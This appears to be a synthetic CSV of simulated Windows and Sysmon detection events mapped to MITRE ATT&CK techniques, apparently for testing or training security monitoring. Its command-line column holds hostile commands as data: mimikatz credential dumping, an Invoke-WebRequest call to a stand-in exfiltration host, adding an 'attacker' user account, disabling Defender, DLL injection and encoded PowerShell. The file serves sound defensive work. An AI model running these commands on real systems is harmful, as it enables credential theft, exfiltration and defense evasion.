timestamp,sourcetype,EventCode,MITRE_Technique,Description,CommandLine,NewProcessName,Source_Network_Address,DestinationPort,User,ParentProcessName
2024-05-28 14:00:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1003.001,Detection of Credential Dumping via mimikatz.exe,".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",C:\Simulated\mimikatz.exe,192.168.56.144,22,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 14:05:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1059.001,Detection of Obfuscated PowerShell via powershell.exe,powershell.exe -EncodedCommand aQBlAHgA,C:\Simulated\powershell.exe,192.168.56.146,3389,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 14:10:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,3,T1071.001,Detection of HTTP Communication via powershell.exe,Invoke-WebRequest -Uri http://malicious.site/exfil,C:\Simulated\powershell.exe,192.168.56.126,443,svc-account,C:\Windows\System32\cmd.exe
2024-05-28 14:15:00,WinEventLog:Security,4625,T1021.001,Detection of RDP Brute Force via mstsc.exe,mstsc.exe /v:192.168.56.102 -session 3,C:\Simulated\mstsc.exe,192.168.56.102,8443,svc-account,C:\Windows\System32\explorer.exe
2024-05-28 14:20:00,WinEventLog:Security,4688,T1086,Detection of CMD Execution via cmd.exe,net user attacker P@ssw0rd! /add,C:\Simulated\cmd.exe,192.168.56.139,8443,SYSTEM,C:\Windows\System32\explorer.exe
2024-05-28 14:25:00,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,10,T1055.001,Detection of DLL Injection via rundll32.exe,"rundll32.exe C:\evil.dll,EntryPoint",C:\Simulated\rundll32.exe,192.168.56.128,80,testuser,C:\Windows\System32\cmd.exe
2024-05-28 14:30:00,WinEventLog:Security,4688,T1036.005,Detection of Masquerading via svchost.exe,ren notepad.exe svchost.exe,C:\Simulated\svchost.exe,192.168.56.114,22,Administrator,C:\Windows\System32\cmd.exe
2024-05-28 14:35:00,WinEventLog:Security,4663,T1005,Detection of Data Collection via robocopy.exe,robocopy C:\sensitive D:\staged /E,C:\Simulated\robocopy.exe,192.168.56.113,8080,jdoe,C:\Windows\System32\cmd.exe
2024-05-28 14:40:00,WinEventLog:Security,4688,T1562.001,Detection of Disable Defender via powershell.exe,Set-MpPreference -DisableRealtimeMonitoring $true,C:\Simulated\powershell.exe,192.168.56.103,445,testuser,C:\Windows\System32\cmd.exe
2024-05-28 14:45:00,WinEventLog:Microsoft-Windows-PowerShell/Operational,4104,T1140,Detection of Encoded Payload via powershell.exe,powershell -enc SQBFAFgA,C:\Simulated\powershell.exe,192.168.56.107,80,SYSTEM,C:\Windows\System32\explorer.exe
